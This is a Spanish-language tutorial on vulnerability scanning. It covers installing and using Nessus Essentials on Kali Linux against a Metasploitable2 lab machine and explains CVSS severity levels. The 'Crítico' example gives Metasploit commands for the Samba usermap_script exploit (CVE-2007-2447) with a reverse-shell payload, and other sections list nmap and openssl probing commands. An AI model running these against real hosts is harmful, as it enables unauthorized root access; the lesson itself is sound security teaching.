# Herramientas de Escaneo de Vulnerabilidades de Seguridad

Existen infinidad de herramientas que nos pueden apoyar a la auditoría de vulnerabilidades en una red, ya sea de Interfaz Gráfica (GUI) o de texto (la terminal). Estas herramientas nos ayudan a identificar debilidades de seguridad en sistemas, redes y aplicaciones antes de que sean explotadas por atacantes. Estas herramientas automatizan el proceso de detección de vulnerabilidades, permitiendo a las organizaciones tomar medidas preventivas para proteger sus activos.

## Identificación proactiva de vulnerabilidades

Permiten detectar vulnerabilidades conocidas y potenciales antes de que sean explotadas, lo que reduce el riesgo de ataques.

## Priorización de la remediación

Ayudan a identificar las vulnerabilidades más críticas, permitiendo a los equipos de seguridad enfocar sus esfuerzos en corregir primero los problemas más peligrosos.

## Mejora de la postura de seguridad

Al identificar y solucionar vulnerabilidades, las organizaciones pueden fortalecer su defensa general contra ciberataques.

## Cumplimiento normativo

Algunas herramientas de escaneo pueden ayudar a las organizaciones a cumplir con los requisitos de cumplimiento normativo relacionados con la seguridad.

## Ahorro de costes de consecuencias

Al prevenir ataques exitosos, las herramientas de escaneo pueden ayudar a evitar pérdidas financieras y de reputación asociadas con incidentes de seguridad.

## Escaneo automatizado

Permiten realizar análisis periódicos y automáticos, lo que reduce la necesidad de realizar escaneos manuales y repetitivos.

## Integración con otras herramientas

Muchas herramientas de escaneo se integran con sistemas de gestión de seguridad, lo que permite una respuesta más rápida a las amenazas.

## Nessus

Nessus es una plataforma de escaneo de vulnerabilidades de seguridad que analiza sistemas, aplicaciones, dispositivos y servicios en la nube para identificar vulnerabilidades. Su objetivo es ayudar a los profesionales de ciberseguridad a descubrir y mitigar riesgos de seguridad antes de que puedan ser explotados. Vamos a instalar en nuestro Kali Linux.

### Instalación

1. Buscar en tu navegador "nessus" y entra a la liga oficial de Tenable, los creadores de la herramienta:

http://es-la.tenable.com/products/nessus/nessus-essentials

> Nota: _Tenable_ ha creado versiones de productos de acuerdo al público de descarga. Si eres estudiante o aprendiz de ciberseguridad, _Nessus Essentials_ es la opción a elegir, ya que si intentar descargar _Nessus (Professional)_ en el formulario te indica _"Please introduce a work email"_, lo cual no admite dominios de emails públicos como _gmail o outlook_, mientras que _Nessus Essentials_ sí.

2. Te va a pedir Nombre y correo profesional antes de descargar el instalador, llena el formulario y te enviara un correo con el _código de activation y el link de descarga_. Haz clic en _Descargar_ y te presentarán la versión de Nessus y el SOs (por defecto ya tienen el paquete para tu SO), después de hacer clic en _Ver descargas_ descarga el paquete de _Tenable Nessus_.

> Nota: La arquitectura de 32 bits, históricamente llamada x86, se refiere a los procesadores y sistemas operativos que pueden procesar datos en bloques de 32 bits. La arquitectura de 64 bits, comúnmente llamada amd64 o x64, es una extensión de x86 que permite procesar datos en bloques de 64 bits. El término "i386" se refiere a la primera familia de procesadores x86 de 32 bits de Intel, mientras que "amd64" se refiere a la implementación original de la arquitectura x86 de 64 bits por AMD.
> Nota: En el mundo de _Linux_, los SOs comúnmente se les llama _Distribuciones o Distros_. Hay 2 tipos de _distros_: Padre e Hija, ejemplo lo es _Debian_ como distro padre de _Kali Linux_ como distro hija. Una distrubición padre es aquella que fue desarrollada sin tener base en otra distro únicamente en el kernel _Linux_, y una distro hija es aquella que se ha basado en una distro padre. Por eso, cuando descargas software para Kali Linux desde internet, aparece _debian o ubuntu_ en el nombre del instalador o paquete.

3. Vamos a nuestra terminal y navegamos mediante _cd_ hacia la ruta de descarga, y utilizamos el comando de instalación para archivos con extensión _.deb_:

```sh
$> sudo dpkg -i Nessus-10.8.4-ubuntu1604-amd64.deb
```

¡Listo! has instalado un software de Kali Linux desde internet hasta tu SO.

> Nota: Es recomendable hacer _sudo apt --fix-broken install_, por si hay dependencias faltantes para tus _.deb_.

4. Instalamos el servicio de _nessusd (nessus.service en la salida de la instalación)_, y para saber el estado de un servicio de Kali Linux, ejecutamos el comando siguiente:

```sh
$> service nessusd status
```

Ahora para iniciarlo:

```sh
$> service nessusd start
```

> Nota: Siempre es recomendable después de iniciar un servicio verificarlo con _service [nombre del servicio] status_, deberá de estar _activo (active (running))_.

5. Abrimos nuestro navegador en otra pestaña, y visitamos la siguiente URL:

_https://localhost:8834_

Es la interfaz gráfica de nuestro servicio de NESSUS, y tiene 2 botones, _Settings y Continue_. Como nosotros ya tenemos un código de activación que está en nuestro correo, haz clic en _Continue_, selecciona en la lista que aparecerá que deseas registrar _Nessus Essentials_, y te pedira el código de activación, **TECLÉALO Y NO LO COPIES DIRECTO DEL CORREO**, ya que varias cuentas de Nessus cuando van a crear el usuario han reportado un mensaje de _**Error: Invalid code format**_ si lo copias y pegas en el campo.

Enseguida te aparecerá el código de activación escrito, clic en _Continue_ y te pedira que crees una cuenta para entrar a Nessus, y finalmente Nessus descargará lo faltante para completar tu instalación.

> Nota: _Nessus_ instalará lo necesario para su funcionamiento en segundo plano (_background_), dependerá de las prestaciones que le hayas puesto al _hardware_ de tu MV. Te darás cuenta que el botón _+ New Scan_ está deshabilitado y un icono de actualización que gira te va indicando el progreso, espera unos momentos para el primer uso. Una vez que haya acabado la instalación de plugins, te recomiendo salir de tu cuenta e iniciar sesión de nuevo.

### Uso

1. En la esquina superior derecha, hay 3 botones, haz clic en _+ New folder_ y crear uno para tus escaneo de esta actividad, como _"kali-lab-scan-test"_.
2. Haz clic en tu nuevo folder en la barra de navegación izquierda, y haz clic en el botón _+ New scan_.
3. En las opciones de escaneo, haz clic en _Basic Network Scan_. Dale un nombre, una descripción y en el campo _Target_, teclea la dirección IP de tu MV de _Metasploitable2_.
4. Ahora haz clic en el botón _Save_ (guardar). Te va a enviar otra vez a la pagina de _My Scans_, el inicio. Haz clic en tu carpeta y encontrarás tu plantilla del escaneo a realizar.
5. Para ejecutarlo, haz clic en el botón de _Play_ que hay al final de la fila del tu plantilla de escaneo. Enseguida ya se estará ejecutando, y para saber más detalles acerca del progreso, haz clic en el nombre de tu registro.
6. El escaneo está contando las incidencias de varios tipos de vulnerabilidades: _Critical, High, Medium, Low, e Info_, habiendo una gráfica de dona, en donde lleva el conteo total. Espera a que el escaneo termine.
7. En los resultados, hay 3 pestañas:

- _Hosts_: Los hosts detectados por _Nessus_, con el conteo de vulnerabilidades por cada uno en la bar.
- _Vulnerabilities_: Esta es la pestaña que reporta todas las vulnerabilidades que detectó la herramienta, en una tabla que lista:

  - Severity: Indica el nivel de riesgo de la vulnerabilidad (Crítico, Alto, Medio, Bajo, Informativo).
  - CVSS: Puntuación de la vulnerabilidad según el Common Vulnerability Scoring System (CVSS), de 0 a 10.
  - VPR (Vulnerability Priority Rating): Prioridad de la vulnerabilidad basada en factores como explotación activa y impacto.
  - EPSS (Exploit Prediction Scoring System): Probabilidad de que la vulnerabilidad sea explotada en el mundo real.
  - Name: Nombre de la vulnerabilidad detectada.
  - Family: Categoría de la vulnerabilidad (ej. Backdoors, Web Servers, Service Detection).
  - Count: Número de veces que la vulnerabilidad aparece en el escaneo.

- Remediations: _Nessus_ lista las recomendaciones que debes de seguir para _reparar_ algunas de las vulnerabilidades encontradas.
- History: Fecha y hora de los escaneos hecho por tu registro de escaneo.

**Y este es un escaneo básico ... _Nessus_ tienes gran cantidad de configuraciones para detallar y hacerlos más precisos.**

## Tipos de Vulnerabilidades

Nessus clasifica las vulnerabilidades en diferentes niveles de **riesgo** según su impacto y facilidad de explotación. A continuación, se explican los principales tipos y se incluye un ejemplo de cada uno.

### Crítico (CVSS 9.0 - 10.0)

Las vulnerabilidades **críticas** permiten a un atacante ejecutar código remoto sin autenticación, tomar control total del sistema o provocar fallos masivos.

**Ejemplo:** Ejecución remota de código en Samba (CVE-2007-2447):

```sh
searchsploit Samba 3.0.20
msf6 > use exploit/multi/samba/usermap_script
msf6 > set rhosts 10.0.2.5
msf6 > set payload cmd/unix/reverse
msf6 > run
```

Impacto: Permite al atacante obtener una shell remota como root, comprometiendo el sistema completamente.

### Alto (CVSS 7.0 - 8.9)

Las vulnerabilidades de alto riesgo facilitan el robo de credenciales, acceso no autorizado o denegación de servicio persistente.

Ejemplo: VNC sin autenticación, VNC permite acceso remoto a una interfaz gráfica, pero si está mal configurado, cualquiera puede conectarse.

```sh
nmap -p 5900 --script vnc-auth-check 10.0.2.5
```

Impacto: Un atacante podría acceder sin credenciales y controlar el escritorio del sistema afectado.

### Medio (CVSS 4.0 - 6.9)

Las vulnerabilidades medias pueden facilitar la recolección de información o ayudar a explotar fallos más críticos.

Ejemplo: SSL obsoleto (Versión 2 y 3 activas).

```sh
openssl s_client -connect 10.0.2.5:443 -ssl3
```

Impacto: Un atacante podría explotar debilidades de cifrado para interceptar comunicaciones sensibles.

### Bajo (CVSS 0.1 - 3.9)

Los fallos de baja severidad suelen requerir condiciones específicas para ser explotados y tienen impacto menor.

Ejemplo: Enumeración de NetBIOS en Windows.

```sh
nmap -p 137 --script smb-os-discovery 10.0.2.5
```

Impacto: Permite obtener información de la máquina como nombre de host y dominio, útil para ataques posteriores.

### Informativo (CVSS 0.0)

Estos hallazgos no representan amenazas directas, pero pueden exponer configuraciones inseguras.

Ejemplo: Servicios expuestos en la red.

```sh
nmap -sV -p- 10.0.2.5
```

Impacto: Identificar qué servicios están abiertos ayuda a prever posibles vulnerabilidades futuras.

## ¿Cómo priorizar la remediación?

- Crítico y Alto: Actualización inmediata o mitigación urgente.
- Medio: Ajustes de configuración para reducir exposición.
- Bajo: Revisión periódica y ajustes según el contexto.
- Informativo: Considerar cambios si afectan la postura de seguridad

## Conclusión

Existen diversas herramientas para la búsqueda y detección de vulnerabilidades en una red, tanto de interfaz de texto como de interfaz gráfica. Una de ellas es **Nessus**, una solución potente para escaneos de seguridad que complementa otras herramientas esenciales en ciberseguridad.

Si bien hemos explorado herramientas como **Nmap, Searchsploit y Metasploit**, **Nessus** aporta un enfoque más detallado y automatizado a la detección de vulnerabilidades, ayudando a generar reportes estructurados y priorizar riesgos. Con el tiempo, te irás familiarizando con la sinergia entre estas herramientas, entendiendo cómo cada una aporta información clave en una auditoría de seguridad.

El ejemplo de esta lección es simple y abierto, pero tiene como objetivo mostrar la conexión entre **Nmap** y **Nessus**, especialmente en la metodología de **escaneo** y el análisis de vulnerabilidades.
